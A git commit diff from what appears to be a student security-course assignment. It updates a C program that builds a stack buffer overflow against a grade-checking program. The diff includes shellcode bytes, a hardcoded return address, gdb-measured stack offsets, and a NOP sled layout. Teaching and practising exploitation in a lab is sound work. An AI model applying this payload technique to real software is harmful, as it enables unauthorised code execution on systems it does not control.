aac5e2648bbdc89deea26aae712e8f735f3529a1
Alex Yu <alexy23@g.ucla.edu>
2022-10-05 07:20:55 -0700

    Change to use AWS server environment

--- assign1/attack-gradeA.c
+++ assign1/attack-gradeA.c
@@ -5,14 +5,14 @@
 // Shellcode assembly taken from the assignment spec and converted into a C array via the
 // provided Python script.
 unsigned char shellcode[] = {
-0x48, 0x8d, 0x25, 0xf9, 0xfe, 0xff, 0xff, 0x48, 0x8d, 0x3d, 0x0d, 0x00, 0x00, 0x00, 0x48,
-0x8d, 0x35, 0x0e, 0x00, 0x00, 0x00, 0x68, 0x30, 0x0c, 0x40, 0x00, 0xc3, 0x41, 0x6c, 0x65,
-0x78, 0x20, 0x59, 0x75, 0x00, 0x41, 0x00, 
+    0x48, 0x8d, 0x25, 0xf9, 0xfe, 0xff, 0xff, 0x48, 0x8d, 0x3d, 0x0d, 0x00, 0x00, 0x00, 0x48,
+    0x8d, 0x35, 0x0e, 0x00, 0x00, 0x00, 0x68, 0x30, 0x0c, 0x40, 0x00, 0xc3, 0x41, 0x6c, 0x65,
+    0x78, 0x20, 0x59, 0x75, 0x00, 0x41, 0x00,
 };
 
 // The return address used by this buffer overflow attack, overwriting the actual return
 // address in the GetGradeFromInput function.
-unsigned char ret_addr[] = { 0xe0, 0xbf, 0xff, 0xff, 0xff, 0x7f, 0x00, 0x00 };
+unsigned char ret_addr[] = { 0xf0, 0xc4, 0xff, 0xff, 0xff, 0x7f, 0x00, 0x00 };
 
 unsigned char nop = 0x90;
 
@@ -24,12 +24,13 @@ int main() {
   * address is where the input text to the program is placed after the call to `gets`. 
   *
   * Using gdb, the following observations were made:
-  *     - %rsp = 0x7fffffffdde0 at the beginning of GetGradeFromInput
-  *     - 0x7fffffffbde0 is the starting address of the input (0xdde0 - 0x2000 = 0xbde0)
-  *     - The original return address for `GetGradeFromInput` is located at 0x7fffffffdde8
-  *     - The input must be 8200 characters for shellcode & padding in order for the new return
-  *         address to overwrite the old one (0xdde8 - 0xbde0 = d8200)
-  *     - The new return address should be around 0x7fffffffbde0
+  *     - 0x7fffffffc420 is the starting address of the input
+  *     - The original return address for `GetGradeFromInput` is located at 0x7fffffffe428
+  *     - The input must be 8200 (0xe428 - 0xc420) characters for shellcode & padding in order for
+  *         the new return address to overwrite the old one
+  *     - The new return address should be somewhere after 0x7fffffffc420
+  *     - With the NOP sled, shellcode can be placed in the middle of the buffer, and then the new
+  *         return address can be somewhere after 0x7fffffffc420 and before the shellcode.
   */
 
   unsigned char buf[8208];
@@ -38,7 +39,7 @@ int main() {
   memset(buf, nop, 8208);
 
   // Put the shellcode in the middle of the buffer
-  memcpy(buf+4000, shellcode, sizeof(shellcode));
+  memcpy(buf+1000, shellcode, sizeof(shellcode));
   
   // Put the new return address at the end of the buffer (overwites the old one)
   memcpy(buf+8200, ret_addr, 8);
